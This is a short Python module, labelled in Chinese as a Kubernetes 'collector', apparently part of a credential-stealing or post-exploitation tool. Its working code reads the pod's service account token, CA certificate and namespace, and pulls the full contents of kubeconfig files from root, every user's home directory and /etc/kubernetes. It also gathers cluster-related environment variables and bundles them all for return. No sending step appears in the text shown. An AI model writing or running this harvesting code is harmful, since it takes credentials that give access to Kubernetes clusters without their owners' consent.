# -*- coding: utf-8 -*-
"""Kubernetes 采集器: ServiceAccount、kubeconfig、环境变量。"""
import os
import glob


SA_TOKEN_PATH = '/var/run/secrets/kubernetes.io/serviceaccount/token'
SA_CA_PATH = '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'
SA_NS_PATH = '/var/run/secrets/kubernetes.io/serviceaccount/namespace'


def _read(p, max_bytes=16384):
    try:
        with open(p, 'rb') as f:
            return f.read(max_bytes).decode(errors='ignore')
    except Exception:
        return None


def _find_kubeconfigs():
    paths = []
    home = os.path.expanduser('~')
    candidates = [
        os.path.join(home, '.kube', 'config'),
        '/root/.kube/config',
    ]
    for g in ['/home/*/.kube/config', '/etc/kubernetes/*.conf']:
        candidates.extend(glob.glob(g))
    for c in candidates:
        if os.path.isfile(c) and os.access(c, os.R_OK):
            paths.append(c)
    return paths


def collect():
    data = {
        'in_k8s': os.path.exists(SA_TOKEN_PATH),
        'namespace': _read(SA_NS_PATH, 512),
        'token': _read(SA_TOKEN_PATH),
        'ca_crt': _read(SA_CA_PATH, 2048),
        'env': {},
        'kubeconfigs': [],
    }

    # 环境变量
    for k in ['KUBERNETES_SERVICE_HOST', 'KUBERNETES_SERVICE_PORT',
              'KUBECONFIG', 'K8S_NAMESPACE']:
        v = os.environ.get(k)
        if v:
            data['env'][k] = v

    for kc in _find_kubeconfigs():
        data['kubeconfigs'].append({
            'path': kc,
            'content': _read(kc, 32768),
        })
    return data